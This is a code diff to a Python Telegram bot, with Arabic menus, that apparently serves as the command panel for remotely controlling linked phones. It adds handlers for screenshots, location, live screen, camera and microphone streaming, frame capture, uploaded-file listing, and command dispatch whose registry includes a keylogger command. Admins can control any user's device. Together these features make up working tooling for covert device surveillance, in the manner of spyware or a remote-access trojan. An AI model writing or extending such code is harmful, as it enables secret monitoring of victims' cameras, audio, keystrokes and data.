@@ -72,7 +72,6 @@ async def api_call(method: str, payload: dict = None, timeout: int = 30) -> dict
             if not result.get('ok'):
                 logger.error(f"TG API error: {method} -> {result}")
             return result
-        store.messages_sent += 1
     except Exception as e:
         logger.error(f"TG API call failed: {method} -> {e}")
         return {"ok": False, "description": str(e)}
@@ -98,7 +97,7 @@ async def send_message(chat_id: str, text: str, parse_mode: str = "HTML",
 async def send_photo(chat_id: str, photo_data: bytes, caption: str = "", reply_markup: dict = None) -> dict:
     await init_session()
     url = f"{API_BASE}/sendPhoto"
-    data = aiohttp.FormData()
+    data = FormData()
     data.add_field("chat_id", str(chat_id))
     data.add_field("photo", photo_data, filename="photo.jpg", content_type="image/jpeg")
     if caption:
@@ -118,7 +117,7 @@ async def send_photo(chat_id: str, photo_data: bytes, caption: str = "", reply_m
 async def send_document(chat_id: str, file_data: bytes, filename: str = "file", caption: str = "") -> dict:
     await init_session()
     url = f"{API_BASE}/sendDocument"
-    data = aiohttp.FormData()
+    data = FormData()
     data.add_field("chat_id", str(chat_id))
     data.add_field("document", file_data, filename=filename)
     if caption:
@@ -251,33 +250,48 @@ def inline_keyboard(buttons: list) -> dict:
 
 
 def main_menu_keyboard(chat_id: str) -> dict:
+    """Main menu mirroring the web dashboard sidebar.
+
+    Web dashboard views: overview, devices, commands, results, streaming,
+    files, events, users (admin), settings. The bot exposes the same set as
+    inline buttons (with commands/results/streaming gated on a selected
+    device, and users gated on admin role).
+    """
     session = get_or_create_tg_session(chat_id)
     is_auth = session.get("authenticated", False)
-    
-    buttons = [
-        [("📡 الحالة", "srv_status")],
-    ]
-    
+
     if is_auth:
+        user = get_user_for_tg(chat_id)
         devices = get_devices_for_tg(chat_id)
         online_count = sum(1 for d in devices if store._device_last_online.get(d['id'], False))
+        selected = session.get("selected_device")
+        is_admin = user.get('role') == 'admin' if user else False
+
         buttons = [
+            # Row 1: Overview (mirrors sidebar «لوحة المعلومات»)
+            [("📊 لوحة المعلومات", "view_overview")],
+            # Row 2: Devices + Commands (commands require a selected device)
             [(
                 f"📱 الأجهزة ({len(devices)} - {online_count} متصل)",
                 "menu_devices"
-            )],
-            [("📊 إحصائيات", "srv_stats"), ("📋 السجلات", "srv_logs")],
-            [("📡 حالة الخادم", "srv_status"), ("⚙️ الإعدادات", "srv_settings")],
-            [("🔗 ربط جهاز", "do_link")],
+            ), ("🎮 الأوامر", "menu_commands" if selected else "menu_devices")],
+            # Row 3: Results + Streaming (both query the selected device)
+            [("✅ النتائج", "view_results"), ("📡 البث", "view_streaming")],
+            # Row 4: Files + Events (no device required)
+            [("📁 الملفات", "view_files"), ("📋 الأحداث", "view_events")],
+            # Row 5: Users (admin only) + Settings
+            [("👥 المستخدمين" if is_admin else "📊 الإحصائيات",
+              "view_users" if is_admin else "srv_stats"),
+             ("⚙️ الإعدادات", "srv_settings")],
+            # Row 6: Server status + Link device
+            [("📡 حالة الخادم", "srv_status"), ("🔗 ربط جهاز", "do_link")],
         ]
-        if len(devices) > 0:
-            buttons.insert(1, [("🎮 إرسال أمر", "menu_commands")])
     else:
         buttons = [
             [("🔐 تسجيل الدخول", "do_login")],
             [("📡 حالة الخادم", "srv_status")],
         ]
-    
+
     return inline_keyboard(buttons)
 
 
@@ -300,15 +314,23 @@ def device_list_keyboard(chat_id: str) -> dict:
 
 
 def device_menu_keyboard(device_id: str) -> dict:
+    """Device menu exposing ALL 8 command categories (parity with commands.py
+    CMD_CATEGORIES) plus quick actions, streaming start/stop, and unlink."""
     buttons = [
-        [("📸 لقطة شاشة", f"quick_screenshot_{device_id}")],
-        [("📍 الموقع", f"quick_location_{device_id}"), ("🔋 البطارية", f"quick_battery_{device_id}")],
+        # Quick actions row
+        [("📸 لقطة شاشة", f"quick_screenshot_{device_id}"),
+         ("📍 الموقع", f"quick_location_{device_id}"),
+         ("🔋 البطارية", f"quick_battery_{device_id}")],
+        # All 8 categories (mirrors CMD_CATEGORIES in commands.py)
         [("📊 البيانات", f"submenu_data_{device_id}"),
-         ("🎮 التحكم", f"submenu_control_{device_id}")],
+         ("💬 التواصل", f"submenu_social_{device_id}")],
+        [("🎮 التحكم", f"submenu_control_{device_id}"),
+         ("📱 التطبيقات", f"submenu_apps_{device_id}")],
         [("📁 الملفات", f"submenu_files_{device_id}"),
          ("🔒 الأمان", f"submenu_security_{device_id}")],
         [("🔍 المراقبة", f"submenu_monitor_{device_id}"),
-         ("📡 البث", f"submenu_streaming_{device_id}")],
+         ("📡 البث المباشر", f"submenu_streaming_{device_id}")],
+        # Device management
         [("🔗 فك الربط", f"do_unlink_{device_id}")],
         [("🔙 رجوع", "menu_devices")],
     ]
@@ -360,6 +382,37 @@ def command_category_picker(device_id: str) -> dict:
             )])
     buttons.append([("🔙 رجوع", f"dev_{device_id}")])
     return inline_keyboard(buttons)
+
+
+def streaming_keyboard(device_id: str) -> dict:
+    """Inline keyboard for streaming start/stop/frame controls.
+    Mirrors the web dashboard's streaming-viewer.tsx (3 video types + audio).
+    """
+    buttons = [
+        [("🖥️ بث الشاشة", f"stream_start_screen_{device_id}"),
+         ("⏹️ إيقاف الشاشة", f"stream_stop_screen_{device_id}")],
+        [("🤳 الكاميرا الأمامية", f"stream_start_front_{device_id}"),
+         ("📷 الكاميرا الخلفية", f"stream_start_back_{device_id}")],
+        [("⏹️ إيقاف الكاميرا", f"stream_stop_front_{device_id}")],
+        [("🎙️ بث الصوت", f"stream_start_audio_{device_id}"),
+         ("⏹️ إيقاف الصوت", f"stream_stop_audio_{device_id}")],
+        [("📸 لقطة من البث", f"stream_frame_{device_id}")],
+        [("⛔ إيقاف كل البث", f"stream_stop_all_{device_id}")],
+        [("🔙 رجوع", f"dev_{device_id}")],
+    ]
+    return inline_keyboard(buttons)
+
+
+def _parse_stream_callback(rest: str) -> tuple:
+    """Parse the suffix of a stream_* callback into (stream_type, device_id).
+
+    Format: <type>_<device_id> where type ∈ {screen, front, back, audio, all}.
+    The type token has no underscores, so a single split works.
+    """
+    if "_" not in rest:
+        return (None, None)
+    stream_type, device_id = rest.split("_", 1)
+    return (stream_type, device_id)
 
 
 # ─── Message Handlers ─────────────────────────────────────────
@@ -516,16 +569,27 @@ async def handle_command(chat_id: str, cmd: str, full_text: str, session: dict):
     elif cmd == "/help":
         help_text = (
             "📖 <b>قائمة الأوامر</b>\n\n"
-            "/start - القائمة الرئيسية\n"
+            "<b>التنقّل</b>\n"
+            "/start - القائمة الرئيسية / ربط الحساب\n"
             "/menu - عرض القائمة\n"
+            "/overview - لوحة المعلومات (نظرة عامة)\n\n"
+            "<b>الأجهزة والأوامر</b>\n"
             "/devices - قائمة الأجهزة\n"
-            "/link - إنشاء كود ربط\n"
+            "/search <بحث> - البحث في الأجهزة\n"
+            "/results - نتائج الأوامر الأخيرة\n"
+            "/streaming - إدارة البث المباشر\n\n"
+            "<b>الملفات والأحداث</b>\n"
+            "/files - الملفات المرفوعة\n"
+            "/events - آخر الأحداث\n\n"
+            "<b>الربط والإدارة</b>\n"
+            "/link - كود الربط الخاص بك (دائم)\n"
             "/unlink <معرف_الجهاز> - فك الربط\n"
+            "/users - المستخدمون (للمسؤول)\n\n"
+            "<b>الخادم</b>\n"
             "/status - حالة الخادم\n"
             "/stats - الإحصائيات\n"
             "/logs - آخر السجلات\n"
-            "/settings - الإعدادات\n"
-            "/search <بحث> - البحث في الأجهزة\n\n"
+            "/settings - الإعدادات\n\n"
             "يمكنك أيضاً التحكم مباشرة عبر الأزرار."
         )
         await send_message(chat_id, help_text, reply_markup=main_menu_keyboard(chat_id))
@@ -638,6 +702,127 @@ async def handle_command(chat_id: str, cmd: str, full_text: str, session: dict):
                 online = store._device_last_online.get(dev['id'], False)
                 text += f"{'🟢' if online else '🔴'} <code>{dev['id']}</code> - {dev.get('model', '')}\n"
             await send_message(chat_id, text)
+
+    elif cmd == "/overview":
+        # Mirrors web dashboard's overview.tsx
+        stats = store.get_stats()
+        online_devices = [d for d in devices if store._device_last_online.get(d['id'], False)]
+        text = (
+            f"📊 <b>لوحة المعلومات</b>\n\n"
+            f"🖥️ الخادم: ✅ يعمل | ⏱️ {stats['uptime'] // 3600}س {stats['uptime'] % 3600 // 60}د\n"
+            f"🔥 Firebase: {'متصل' if _fb.firebase_connected else 'غير متصل'} | v{VERSION}\n\n"
+            f"📱 <b>الأجهزة</b> ({stats['devices_total']})\n"
+            f"   🟢 متصل: {stats['devices_online']} | 🔴 غير متصل: {stats['devices_offline']}\n\n"
+            f"🎮 <b>الأوامر</b>\n"
+            f"   الإجمالي: {stats['commands_total']}\n"
+            f"   ✅ مكتملة: {stats['commands_completed']}\n"
+            f"   ⏳ معلقة: {stats['commands_pending']}\n\n"
+            f"📋 الأحداث: {stats['events_count']}\n"
+            f"📁 ملفات نشطة: {stats['files_active']}\n"
+            f"👤 المستخدمون: {stats['users_total']}\n"
+        )
+        if online_devices:
+            text += "\n🟢 <b>الأجهزة المتصلة:</b>\n"
+            for d in online_devices[:5]:
+                text += f"   • {d.get('model', d['id'])}\n"
+        await send_message(chat_id, text, reply_markup=main_menu_keyboard(chat_id))
+
+    elif cmd == "/results":
+        # Mirrors web dashboard's command-results.tsx
+        selected = session.get("selected_device")
+        cmds = await store.get_commands_history(device_id=selected, limit=15)
+        cmds = [c for c in cmds if c.get('status') in ('completed', 'failed')]
+        if not cmds:
+            await send_message(chat_id,
+                "✅ <b>نتائج الأوامر</b>\n\nلا توجد نتائج بعد.",
+                reply_markup=main_menu_keyboard(chat_id))
+            return
+        text = f"✅ <b>نتائج الأوامر ({len(cmds)})</b>\n\n"
+        for c in cmds[:10]:
+            status_icon = "✅" if c.get('status') == 'completed' else "❌"
+            cmd_name = c.get('command', '')
+            dev = store.devices.get(c.get('device_id', ''), {})
+            dev_name = dev.get('model', c.get('device_id', '')[:8])
+            result_preview = str(c.get('result', ''))[:80].replace('\n', ' ')
+            text += f"{status_icon} <b>{cmd_name}</b> → {dev_name}\n"
+            if result_preview:
+                text += f"   <code>{result_preview}</code>\n"
+        await send_message(chat_id, text, reply_markup=main_menu_keyboard(chat_id))
+
+    elif cmd == "/streaming":
+        selected = session.get("selected_device")
+        if not selected:
+            await send_message(chat_id, "⚠️ اختر جهازاً أولاً.",
+                             reply_markup=device_list_keyboard(chat_id))
+            return
+        device = store.devices.get(selected)
+        if not device:
+            await send_message(chat_id, "❌ الجهاز غير موجود.")
+            return
+        online = store._device_last_online.get(selected, False)
+        status = "🟢 متصل" if online else "🔴 غير متصل"
+        await send_message(chat_id,
+            f"📡 <b>البث المباشر</b>\n\n"
+            f"📱 الجهاز: {device.get('model', selected)}\n"
+            f"📊 الحالة: {status}\n\n"
+            f"اختر نوع البث:",
+            reply_markup=streaming_keyboard(selected))
+
+    elif cmd == "/files":
+        # Mirrors web dashboard's file-viewer.tsx
+        is_admin = user.get('role') == 'admin'
+        files = []
+        for fid, fmeta in store.files.items():
+            dev = store.devices.get(fmeta.get('device_id', ''))
+            if not dev:
+                continue
+            if is_admin or dev.get('owner_id') == user['id']:
+                safe = dict(fmeta)
+                safe['device_name'] = dev.get('model', dev['id'])
+                files.append(safe)
+        if not files:
+            await send_message(chat_id,
+                "📁 <b>الملفات</b>\n\nلا توجد ملفات مرفوعة.\n"
+                "الملفات تُحذف تلقائياً بعد ساعة من رفعها.",
+                reply_markup=main_menu_keyboard(chat_id))
+            return
+        text = f"📁 <b>الملفات ({len(files)})</b>\n\n"
+        for f in files[:15]:
+            icon = "📸" if f.get('file_type') == 'screenshot' else "🖼️" if f.get('file_type') == 'photo' else "📎"
+            name = f.get('filename', 'unknown')[:30]
+            size_kb = (f.get('size', 0) or 0) // 1024
+            text += f"{icon} {name} ({size_kb} KB) — {f.get('device_name', '?')}\n"
+        await send_message(chat_id, text, reply_markup=main_menu_keyboard(chat_id))
+
+    elif cmd == "/events":
+        selected = session.get("selected_device")
+        events = await store.get_events(device_id=selected, limit=15)
+        if not events:
+            await send_message(chat_id, "📋 لا توجد أحداث.",
+                             reply_markup=main_menu_keyboard(chat_id))
+            return
+        text = f"📋 <b>آخر الأحداث ({len(events)})</b>\n\n"
+        for evt in events[:10]:
+            icon = {"info": "ℹ️", "success": "✅", "warning": "⚠️", "error": "❌"}.get(evt.get('level', ''), "ℹ️")
+            text += f"{icon} {evt.get('event', '')[:80]}\n"
+        await send_message(chat_id, text, reply_markup=main_menu_keyboard(chat_id))
+
+    elif cmd == "/users":
+        if user.get('role') != 'admin':
+            await send_message(chat_id, "⛔ هذه الميزة للمسؤول فقط.",
+                             reply_markup=main_menu_keyboard(chat_id))
+            return
+        users = await store.list_users()
+        text = f"👥 <b>المستخدمون ({len(users)})</b>\n\n"
+        for u in users[:15]:
+            role_icon = "👑" if u.get('role') == 'admin' else "👤"
+            devices_count = sum(1 for d in store.devices.values() if d.get('owner_id') == u['id'])
+            text += (f"{role_icon} <b>{u.get('username', '?')}</b> "
+                     f"[{u.get('role', 'user')}]\n"
+                     f"   📧 {u.get('email', '?')}\n"
+                     f"   📱 {devices_count} جهاز\n"
+                     f"   🆔 <code>{u['id']}</code>\n\n")
+        await send_message(chat_id, text, reply_markup=main_menu_keyboard(chat_id))
     
     elif cmd in COMMAND_REGISTRY:
         # Direct command execution: /screenshot, /location, etc.
@@ -656,44 +841,49 @@ async def handle_command(chat_id: str, cmd: str, full_text: str, session: dict):
 # ─── Callback Query Handlers ──────────────────────────────────
 
 async def handle_callback(chat_id: str, callback_data: str, message_id: int):
-    """Handle inline button presses."""
+    """Handle inline button presses.
+
+    NOTE: ``message_id`` is actually the Telegram ``callback_query_id`` (the
+    callback's unique identifier, used to dismiss the loading spinner via
+    answerCallbackQuery). The parameter name is kept for backward compat.
+    """
     session = get_or_create_tg_session(chat_id)
     user = get_user_for_tg(chat_id)
-    
+
     # Unauthenticated actions
     if callback_data == "do_login":
-        await answer_callback_query(callback_data=message_id, text="أرسل: اسم_المستخدم كلمة_المرور", show_alert=False)
+        await answer_callback_query(callback_query_id=message_id, text="أرسل: اسم_المستخدم كلمة_المرور", show_alert=False)
         return
-    
+
     if callback_data == "do_register":
         await send_message(chat_id, "📝 للتسجيل، تواصل مع المسؤول.")
         return
-    
+
     if not session.get("authenticated") or not user:
-        await answer_callback_query(callback_data=message_id, text="سجل دخولك أولاً", show_alert=True)
+        await answer_callback_query(callback_query_id=message_id, text="سجل دخولك أولاً", show_alert=True)
         return
-    
-    await answer_callback_query(callback_data=message_id)
+
+    await answer_callback_query(callback_query_id=message_id)
     devices = get_devices_for_tg(chat_id)
-    
+
     # ─── Navigation ────────────────────────────────────────────
     if callback_data == "back_main":
         await send_message(chat_id, "📋 القائمة الرئيسية:", reply_markup=main_menu_keyboard(chat_id))
-    
+
     elif callback_data == "menu_devices":
         if not devices:
             await send_message(chat_id, "📱 لا توجد أجهزة. استخدم /link لربط جهاز.")
         else:
             text = f"📱 <b>اختر جهازاً ({len(devices)})</b>"
             await send_message(chat_id, text, reply_markup=device_list_keyboard(chat_id))
-    
+
     elif callback_data == "menu_commands":
         if not session.get("selected_device"):
             await send_message(chat_id, "⚠️ اختر جهازاً أولاً.", reply_markup=device_list_keyboard(chat_id))
         else:
             await send_message(chat_id, "🎮 اختر فئة الأوامر:",
                              reply_markup=command_category_picker(session["selected_device"]))
-    
+
     elif callback_data == "do_link":
         # Lifelong permanent code (one per user, stored in Firebase).
         code = await store.get_or_create_permanent_code(user['id'])
@@ -707,7 +897,217 @@ async def handle_callback(chat_id: str, callback_data: str, message_id: int):
             f"🔗 <b>كود الربط الخاص بك</b>\n\n<code>{code}</code>\n\n"
             f"♾️ صالح مدى الحياة — لا يحتاج للتجديد.",
             reply_markup=main_menu_keyboard(chat_id))
-    
+
+    # ─── Dashboard Parity Views (mirrors web dashboard sidebar) ─
+    elif callback_data == "view_overview":
+        # Mirrors web dashboard's overview.tsx: server stats + devices summary
+        stats = store.get_stats()
+        online_devices = [d for d in devices if store._device_last_online.get(d['id'], False)]
+        offline_devices = [d for d in devices if not store._device_last_online.get(d['id'], False)]
+        text = (
+            f"📊 <b>لوحة المعلومات</b>\n\n"
+            f"🖥️ الخادم: ✅ يعمل | ⏱️ {stats['uptime'] // 3600}س {stats['uptime'] % 3600 // 60}د\n"
+            f"🔥 Firebase: {'متصل' if _fb.firebase_connected else 'غير متصل'} | v{VERSION}\n\n"
+            f"📱 <b>الأجهزة</b> ({stats['devices_total']})\n"
+            f"   🟢 متصل: {stats['devices_online']} | 🔴 غير متصل: {stats['devices_offline']}\n\n"
+            f"🎮 <b>الأوامر</b>\n"
+            f"   الإجمالي: {stats['commands_total']}\n"
+            f"   ✅ مكتملة: {stats['commands_completed']}\n"
+            f"   ⏳ معلقة: {stats['commands_pending']}\n\n"
+            f"📋 الأحداث: {stats['events_count']}\n"
+            f"📁 ملفات نشطة: {stats['files_active']}\n"
+            f"👤 المستخدمون: {stats['users_total']}\n"
+        )
+        if online_devices:
+            text += "\n🟢 <b>الأجهزة المتصلة:</b>\n"
+            for d in online_devices[:5]:
+                text += f"   • {d.get('model', d['id'])}\n"
+        await send_message(chat_id, text, reply_markup=main_menu_keyboard(chat_id))
+
+    elif callback_data == "view_results":
+        # Mirrors web dashboard's command-results.tsx: shows completed command results
+        selected = session.get("selected_device")
+        cmds = await store.get_commands_history(device_id=selected, limit=15)
+        cmds = [c for c in cmds if c.get('status') in ('completed', 'failed')]
+        if not cmds:
+            await send_message(chat_id,
+                "✅ <b>نتائج الأوامر</b>\n\nلا توجد نتائج بعد."
+                + ("\n⚠️ اختر جهازاً أولاً لعرض نتائجه." if not selected else ""),
+                reply_markup=inline_keyboard([[
+                    ("📱 اختيار جهاز", "menu_devices"),
+                    ("🔙 القائمة", "back_main"),
+                ]]))
+            return
+        text = f"✅ <b>نتائج الأوامر ({len(cmds)})</b>\n\n"
+        for c in cmds[:10]:
+            status_icon = "✅" if c.get('status') == 'completed' else "❌"
+            cmd = c.get('command', '')
+            dev = store.devices.get(c.get('device_id', ''), {})
+            dev_name = dev.get('model', c.get('device_id', '')[:8])
+            result_preview = str(c.get('result', ''))[:80].replace('\n', ' ')
+            text += f"{status_icon} <b>{cmd}</b> → {dev_name}\n"
+            if result_preview:
+                text += f"   <code>{result_preview}</code>\n"
+        await send_message(chat_id, text, reply_markup=inline_keyboard([[
+            ("🔄 تحديث", "view_results"),
+            ("🔙 القائمة", "back_main"),
+        ]]))
+
+    elif callback_data == "view_streaming":
+        # Mirrors web dashboard's streaming-viewer.tsx: start/stop streams
+        selected = session.get("selected_device")
+        if not selected:
+            await send_message(chat_id, "⚠️ اختر جهازاً أولاً.",
+                             reply_markup=device_list_keyboard(chat_id))
+            return
+        device = store.devices.get(selected)
+        if not device:
+            await send_message(chat_id, "❌ الجهاز غير موجود.")
+            return
+        online = store._device_last_online.get(selected, False)
+        status = "🟢 متصل" if online else "🔴 غير متصل"
+        await send_message(chat_id,
+            f"📡 <b>البث المباشر</b>\n\n"
+            f"📱 الجهاز: {device.get('model', selected)}\n"
+            f"📊 الحالة: {status}\n\n"
+            f"اختر نوع البث:",
+            reply_markup=streaming_keyboard(selected))
+
+    elif callback_data.startswith("stream_start_"):
+        # stream_start_<type>_<device_id>  where type ∈ {screen, front, back, audio}
+        rest = callback_data[len("stream_start_"):]
+        stream_type, device_id = _parse_stream_callback(rest)
+        if not device_id:
+            await send_message(chat_id, "❌ تعذر تحديد الجهاز.")
+            return
+        cmd_map = {
+            "screen": "start_screen_stream",
+            "front": "start_camera_stream",
+            "back": "start_camera_stream",
+            "audio": "start_audio_stream",
+        }
+        cmd_key = cmd_map.get(stream_type)
+        if not cmd_key:
+            await send_message(chat_id, f"❌ نوع بث غير معروف: {stream_type}")
+            return
+        params = {"camera": "back"} if stream_type == "back" else (
+                  {"camera": "front"} if stream_type == "front" else {})
+        await execute_device_command(chat_id, cmd_key, device_id, user, params_override=params)
+
+    elif callback_data.startswith("stream_stop_"):
+        rest = callback_data[len("stream_stop_"):]
+        stream_type, device_id = _parse_stream_callback(rest)
+        if not device_id:
+            await send_message(chat_id, "❌ تعذر تحديد الجهاز.")
+            return
+        cmd_map = {
+            "screen": "stop_screen_stream",
+            "front": "stop_camera_stream",
+            "back": "stop_camera_stream",
+            "audio": "stop_audio_stream",
+            "all": "stop_all_streams",
+        }
+        cmd_key = cmd_map.get(stream_type, "stop_all_streams")
+        await execute_device_command(chat_id, cmd_key, device_id, user)
+
+    elif callback_data.startswith("stream_frame_"):
+        # Fetch the latest cached frame from store.latest_frames and send as photo
+        device_id = callback_data[len("stream_frame_"):]
+        frame = store.latest_frames.get(f"{device_id}:video")
+        if not frame or not frame.get('data'):
+            await send_message(chat_id,
+                "⚠️ لا يوجد إطار متاح. تأكد أن البث يعمل ثم حاول مجدداً.",
+                reply_markup=streaming_keyboard(device_id))
+            return
+        try:
+            import base64
+            img_bytes = base64.b64decode(frame['data'])
+            await send_photo(chat_id, img_bytes,
+                caption=f"📸 إطار مباشر — {datetime.utcnow().strftime('%H:%M:%S')} UTC",
+                reply_markup=streaming_keyboard(device_id))
+        except Exception as e:
+            await send_message(chat_id, f"❌ فشل فك ترميز الإطار: {e}")
+
+    elif callback_data == "view_files":
+        # Mirrors web dashboard's file-viewer.tsx: lists uploaded files grouped by type
+        user_id = user['id']
+        is_admin = user.get('role') == 'admin'
+        files = []
+        for fid, fmeta in store.files.items():
+            dev = store.devices.get(fmeta.get('device_id', ''))
+            if not dev:
+                continue
+            if is_admin or dev.get('owner_id') == user_id:
+                safe = dict(fmeta)
+                safe['device_name'] = dev.get('model', dev['id'])
+                files.append(safe)
+        if not files:
+            await send_message(chat_id,
+                "📁 <b>الملفات</b>\n\nلا توجد ملفات مرفوعة.\n"
+                "الملفات تُحذف تلقائياً بعد ساعة من رفعها.",
+                reply_markup=main_menu_keyboard(chat_id))
+            return
+        # Group by file_type
+        groups = {}
+        for f in files:
+            t = f.get('file_type', 'other')
+            groups.setdefault(t, []).append(f)
+        text = f"📁 <b>الملفات ({len(files)})</b>\n\n"
+        type_icons = {"screenshot": "📸", "photo": "🖼️", "video": "🎬",
+                      "audio": "🎵", "document": "📄", "other": "📎"}
+        for ftype, fitems in groups.items():
+            icon = type_icons.get(ftype, "📎")
+            text += f"{icon} <b>{ftype}</b> ({len(fitems)})\n"
+            for f in fitems[:3]:
+                name = f.get('filename', 'unknown')[:30]
+                size_kb = (f.get('size', 0) or 0) // 1024
+                text += f"   • {name} ({size_kb} KB) — {f.get('device_name', '?')}\n"
+            if len(fitems) > 3:
+                text += f"   • ...و {len(fitems) - 3} ملفات أخرى\n"
+            text += "\n"
+        await send_message(chat_id, text, reply_markup=main_menu_keyboard(chat_id))
+
+    elif callback_data == "view_events":
+        # Mirrors web dashboard's events view
+        selected = session.get("selected_device")
+        events = await store.get_events(device_id=selected, limit=15)
+        if not events:
+            await send_message(chat_id,
+                "📋 <b>الأحداث</b>\n\nلا توجد أحداث.",
+                reply_markup=inline_keyboard([[
+                    ("🔄 تحديث", "view_events"),
+                    ("🔙 القائمة", "back_main"),
+                ]]))
+            return
+        text = f"📋 <b>آخر الأحداث ({len(events)})</b>\n\n"
+        for evt in events[:10]:
+            icon = {"info": "ℹ️", "success": "✅", "warning": "⚠️", "error": "❌"}.get(evt.get('level', ''), "ℹ️")
+            text += f"{icon} {evt.get('event', '')[:80]}\n"
+            if evt.get('details'):
+                text += f"   <i>{evt['details'][:60]}</i>\n"
+        await send_message(chat_id, text, reply_markup=inline_keyboard([[
+            ("🔄 تحديث", "view_events"),
+            ("🔙 القائمة", "back_main"),
+        ]]))
+
+    elif callback_data == "view_users":
+        # Mirrors web dashboard's users view (admin only)
+        if user.get('role') != 'admin':
+            await send_message(chat_id, "⛔ هذه الميزة للمسؤول فقط.",
+                             reply_markup=main_menu_keyboard(chat_id))
+            return
+        users = await store.list_users()
+        text = f"👥 <b>المستخدمون ({len(users)})</b>\n\n"
+        for u in users[:15]:
+            role_icon = "👑" if u.get('role') == 'admin' else "👤"
+            devices_count = sum(1 for d in store.devices.values() if d.get('owner_id') == u['id'])
+            text += (f"{role_icon} <b>{u.get('username', '?')}</b> "
+                     f"[{u.get('role', 'user')}]\n"
+                     f"   📧 {u.get('email', '?')}\n"
+                     f"   📱 {devices_count} جهاز\n"
+                     f"   🆔 <code>{u['id']}</code>\n\n")
+        await send_message(chat_id, text, reply_markup=main_menu_keyboard(chat_id))
+
     # ─── Server Management ────────────────────────────────────
     elif callback_data == "srv_status":
         stats = store.get_stats()
@@ -715,14 +1115,14 @@ async def handle_callback(chat_id: str, callback_data: str, message_id: int):
             f"📡 <b>حالة الخادم</b>\n✅ يعمل | ⏱️ {stats['uptime'] // 3600}س | "
             f"📱 {stats['devices_online']}/{stats['devices_total']} | "
             f"🔥 {'متصل' if _fb.firebase_connected else 'غير متصل'} | v{VERSION}")
-    
+
     elif callback_data == "srv_stats":
         stats = store.get_stats()
         await send_message(chat_id,
             f"📊 الأجهزة: {stats['devices_total']} | متصل: {stats['devices_online']} | "
             f"أوامر: {stats['commands_completed']}/{stats['commands_total']} | "
             f"أحداث: {stats['events_count']} | ملفات: {stats['files_active']}")
-    
+
     elif callback_data == "srv_logs":
         events = await store.get_events(limit=10)
         text = "📋 آخر السجلات:\n"
@@ -730,7 +1130,7 @@ async def handle_callback(chat_id: str, callback_data: str, message_id: int):
             icon = {"info": "ℹ️", "success": "✅", "warning": "⚠️", "error": "❌"}.get(evt.get('level', ''), "ℹ️")
             text += f"{icon} {evt.get('event', '')[:60]}\n"
         await send_message(chat_id, text if len(text) > 25 else "📋 لا توجد سجلات.")
-    
+
     elif callback_data == "srv_settings":
         text = "⚙️ الإعدادات:\n"
         for k, v in store.settings.items():
@@ -783,10 +1183,20 @@ async def handle_callback(chat_id: str, callback_data: str, message_id: int):
     
     # ─── Category Submenus ───────────────────────────────────
     elif callback_data.startswith("submenu_"):
-        parts = callback_data.split("_", 2)  # submenu_category_device_id
-        if len(parts) >= 3:
-            category = parts[1]
-            device_id = "_".join(parts[2:])
+        # Format: submenu_<category>_<device_id>. Categories come from
+        # CMD_CATEGORIES (data, social, control, apps, files, security,
+        # monitor, streaming) — none contain underscores, but we still use
+        # a registry-style lookup for robustness against future renames.
+        rest = callback_data[len("submenu_"):]
+        category = None
+        device_id = None
+        for cat_id in CMD_CATEGORIES:
+            prefix = cat_id + "_"
+            if rest.startswith(prefix):
+                category = cat_id
+                device_id = rest[len(prefix):]
+                break
+        if category and device_id:
             # Ownership enforcement before showing command menu for a device.
             device = store.devices.get(device_id)
             if not device or (device.get('owner_id') != user['id'] and user.get('role') != 'admin'):
@@ -795,14 +1205,29 @@ async def handle_callback(chat_id: str, callback_data: str, message_id: int):
             cat_info = CMD_CATEGORIES.get(category, {})
             await send_message(chat_id, f"📂 {cat_info.get('name', category)}:",
                              reply_markup=category_commands_keyboard(category, device_id))
-    
+        else:
+            await send_message(chat_id, "❌ فئة غير معروفة.",
+                             reply_markup=main_menu_keyboard(chat_id))
+
     # ─── Execute Command ──────────────────────────────────────
     elif callback_data.startswith("exec_"):
-        parts = callback_data.split("_", 2)
-        if len(parts) >= 3:
-            cmd_key = parts[1]
-            device_id = "_".join(parts[2:])
+        # Format: exec_<cmd_key>_<device_id>. Many cmd_keys contain underscores
+        # (e.g. wifi_info, start_screen_stream, keylogger_start), so we can't
+        # use a simple split. Instead, look up the cmd_key in COMMAND_REGISTRY.
+        rest = callback_data[len("exec_"):]
+        cmd_key = None
+        device_id = None
+        for key in COMMAND_REGISTRY:
+            prefix = key + "_"
+            if rest.startswith(prefix):
+                cmd_key = key
+                device_id = rest[len(prefix):]
+                break
+        if cmd_key and device_id:
             await execute_device_command(chat_id, cmd_key, device_id, user)
+        else:
+            await send_message(chat_id, f"❌ تعذر تحديد الأمر: <code>{rest}</code>",
+                             reply_markup=main_menu_keyboard(chat_id))
     
     # ─── Unlink Device ────────────────────────────────────────
     elif callback_data.startswith("do_unlink_"):
@@ -823,8 +1248,13 @@ async def handle_callback(chat_id: str, callback_data: str, message_id: int):
 
 # ─── Command Execution ────────────────────────────────────────
 
-async def execute_device_command(chat_id: str, cmd_key: str, device_id: str, user: dict):
-    """Execute a command on a device and track the result for Telegram delivery."""
+async def execute_device_command(chat_id: str, cmd_key: str, device_id: str, user: dict,
+                               params_override: dict = None):
+    """Execute a command on a device and track the result for Telegram delivery.
+
+    ``params_override`` lets callers (e.g. streaming start with camera=front/back)
+    supply extra params on top of the registry defaults.
+    """
     cmd_def = COMMAND_REGISTRY.get(cmd_key)
     if not cmd_def:
         await send_message(chat_id, f"❌ الأمر غير معروف: {cmd_key}")
@@ -837,7 +1267,7 @@ async def execute_device_command(chat_id: str, cmd_key: str, device_id: str, use
     
     # ─── Ownership enforcement (multi-user isolation) ───────────
     # A user may only execute commands on devices they own.
-    if device.get('owner_id') != user['id']:
+    if device.get('owner_id') != user['id'] and user.get('role') != 'admin':
         await send_message(chat_id, "⛔ ليس لديك صلاحية للتحكم في هذا الجهاز.")
         logger.warning(f"TG ownership denied: chat={chat_id} user={user.get('id')} device={device_id} owner={device.get('owner_id')}")
         return
@@ -849,7 +1279,9 @@ async def execute_device_command(chat_id: str, cmd_key: str, device_id: str, use
     cmd_name = cmd_def.get('name', cmd_key)
     cmd_icon = cmd_def.get('icon', '🎮')
     actual_cmd = cmd_def['cmd']
-    params = cmd_def.get('params', {})
+    params = dict(cmd_def.get('params', {}))  # copy so we don't mutate the registry
+    if params_override:
+        params.update(params_override)
     
     # Queue the command
     queued = await store.queue_command(
@@ -863,12 +1295,15 @@ async def execute_device_command(chat_id: str, cmd_key: str, device_id: str, use
     # Also push to Firebase for real-time delivery
     from .firebase_client import push_command
     if _fb.firebase_connected:
-        await push_command(device_id, {
-            "id": queued['id'],
